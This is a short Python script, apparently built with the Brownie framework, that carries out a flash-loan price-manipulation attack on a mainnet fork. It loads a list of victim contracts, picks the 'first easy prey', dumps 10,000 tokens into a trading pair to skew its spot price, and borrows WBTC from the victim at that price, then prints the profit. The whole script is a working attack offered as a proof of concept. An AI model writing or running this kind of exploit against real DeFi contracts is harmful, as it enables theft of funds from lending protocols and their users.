#!/usr/bin/env python3
import json, os
from brownie import FlashManipulator, interface, accounts, network

network.connect("mainnet-fork")   # requires RPC in .env
me = accounts[0]

def main():
    with open("../src/final_targets.json") as f:
        targets = json.load(f)
    t = targets[0]  # pick first easy prey
    pair   = t["pair"]
    tokenA = t["token0"]
    tokenB = t["token1"]
    victim = t["spot_consumer"]

    flash = FlashManipulator.deploy({"from": me})
    print("FlashManipulator deployed at", flash.address)

    # example calldata: borrow 1 WBTC at manipulated price
    borrow_calldata = interface.IVictim(victim).borrow.encode_input(1e8, tokenB)

    tx = flash.exploit(
        pair,
        tokenA,
        tokenB,
        10_000 * 10**t["decimals0"],  # dump 10 k tokenA
        victim,
        borrow_calldata,
        {"from": me}
    )
    print("PoC tx sent:", tx.txid)
    print("Profit left in contract:", interface.IERC20(tokenB).balanceOf(flash))
